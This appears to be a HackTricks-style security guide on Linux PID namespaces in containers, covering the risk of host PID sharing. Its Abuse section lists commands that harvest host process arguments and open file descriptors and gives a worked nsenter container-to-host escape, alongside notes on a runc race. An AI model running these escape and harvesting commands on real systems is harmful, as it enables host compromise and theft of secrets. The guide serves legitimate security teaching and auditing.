# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Overview

The PID namespace controls how processes are numbered and which processes are visible. This is why a container can have its own PID 1 even though it is not a real machine. Inside the namespace, the workload sees what appears to be a local process tree. Outside the namespace, the host still sees the real host PIDs and the full process landscape.

From a security point of view, the PID namespace matters because process visibility is valuable. Once a workload can see host processes, it may be able to observe service names, command-line arguments, secrets passed in process arguments, environment-derived state through `/proc`, and potential namespace-entry targets. If it can do more than just see those processes, for example by sending signals or using ptrace under the right conditions, the problem becomes much more serious.

## Operation

A new PID namespace starts with its own internal process numbering. The first process created inside it becomes PID 1 from the namespace's point of view, which also means it gets special init-like semantics for orphaned children and signal behavior. This explains a lot of container oddities around init processes, zombie reaping, and why tiny init wrappers are sometimes used in containers.

The important security lesson is that a process may look isolated because it sees only its own PID tree, but that isolation can be deliberately removed. Docker exposes this through `--pid=host`, while Kubernetes does it through `hostPID: true`. Once the container joins the host PID namespace, the workload sees host processes directly, and many later attack paths become much more realistic.

## Lab

To create a PID namespace manually:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

The shell now sees a private process view. The `--mount-proc` flag is important because it mounts a procfs instance that matches the new PID namespace, making the process list coherent from inside.

To compare container behavior:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

The difference is immediate and easy to understand, which is why this is a good first lab for readers.

## Runtime Usage

Normal containers in Docker, Podman, containerd, and CRI-O get their own PID namespace. Kubernetes Pods usually also receive an isolated PID view unless the workload explicitly asks for host PID sharing. LXC/Incus environments rely on the same kernel primitive, though system-container use cases may expose more complicated process trees and encourage more debugging shortcuts.

The same rule applies everywhere: if the runtime chose not to isolate the PID namespace, that is a deliberate reduction in the container boundary.

## Misconfigurations

The canonical misconfiguration is host PID sharing. Teams often justify it for debugging, monitoring, or service-management convenience, but it should always be treated as a meaningful security exception. Even if the container has no immediate write primitive over host processes, visibility alone can reveal a lot about the system. Once capabilities such as `CAP_SYS_PTRACE` or useful procfs access are added, the risk expands significantly.

Another mistake is assuming that because the workload cannot kill or ptrace host processes by default, host PID sharing is therefore harmless. That conclusion ignores the value of enumeration, the availability of namespace-entry targets, and the way PID visibility combines with other weakened controls.

## Abuse

If the host PID namespace is shared, an attacker may inspect host processes, harvest process arguments, identify interesting services, locate candidate PIDs for `nsenter`, or combine process visibility with ptrace-related privilege to interfere with host or neighboring workloads. In some cases, simply seeing the right long-running process is enough to reshape the rest of the attack plan.

The first practical step is always to confirm that host processes are really visible:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Once host PIDs are visible, process arguments and namespace-entry targets often become the most useful information source:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

If `nsenter` is available and enough privilege exists, test whether a visible host process can be used as a namespace bridge:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Even when entry is blocked, host PID sharing is already valuable because it reveals service layout, runtime components, and candidate privileged processes to target next.

Host PID visibility also makes file-descriptor abuse more realistic. If a privileged host process or neighboring workload has a sensitive file or socket open, the attacker may be able to inspect `/proc/<pid>/fd/` and reuse that handle depending on ownership, procfs mount options, and the target service model.

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

These commands are useful because they answer whether `hidepid=1` or `hidepid=2` is reducing cross-process visibility and whether obviously interesting descriptors such as open secret files, logs, or Unix sockets are visible at all.

### Full Example: host PID + `nsenter`

Host PID sharing becomes a direct host escape when the process also has enough privilege to join the host namespaces:

```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```

If the command succeeds, the container process is now executing in the host mount, UTS, network, IPC, and PID namespaces. The impact is immediate host compromise.

Even when `nsenter` itself is missing, the same result may be achievable through the host binary if the host filesystem is mounted:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```

### Recent Runtime Notes

Some PID-namespace-relevant attacks are not traditional `hostPID: true` misconfigurations, but runtime implementation bugs around how procfs protections are applied during container setup.

#### `maskedPaths` race to host procfs

In vulnerable `runc` versions, attackers able to control the container image or `runc exec` workload could race the masking phase by replacing container-side `/dev/null` with a symlink to a sensitive procfs path such as `/proc/sys/kernel/core_pattern`. If the race succeeded, the masked-path bind mount could land on the wrong target and expose host-global procfs knobs to the new container.

Useful review command:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

This is important because the eventual impact may be the same as a direct procfs exposure: writable `core_pattern` or `sysrq-trigger`, followed by host code execution or denial of service.

#### Namespace injection with `insject`

Namespace injection tools such as `insject` show that PID-namespace interaction does not always require pre-entering the target namespace before process creation. A helper can attach later, use `setns()`, and execute while preserving visibility into the target PID space:

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

This kind of technique matters mainly for advanced debugging, offensive tooling, and post-exploitation workflows where namespace context must be joined after the runtime has already initialized the workload.

### Related FD Abuse Patterns

Two patterns are worth calling out explicitly when host PIDs are visible. First, a privileged process may keep a sensitive file descriptor open across `execve()` because it was not marked `O_CLOEXEC`. Second, services may pass file descriptors over Unix sockets through `SCM_RIGHTS`. In both cases the interesting object is not the pathname anymore, but the already-open handle that a lower-privilege process may inherit or receive.

This matters in container work because the handle may point to `docker.sock`, a privileged log, a host secret file, or another high-value object even when the path itself is not directly reachable from the container filesystem.

## Checks

The purpose of these commands is to determine whether the process has a private PID view or whether it can already enumerate a much broader process landscape.

```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```

What is interesting here:

- If the process list contains obvious host services, host PID sharing is probably already in effect.
- Seeing only a tiny container-local tree is the normal baseline; seeing `systemd`, `dockerd`, or unrelated daemons is not.
- Once host PIDs are visible, even read-only process information becomes useful reconnaissance.

If you discover a container running with host PID sharing, do not treat it as a cosmetic difference. It is a major change in what the workload can observe and potentially affect.
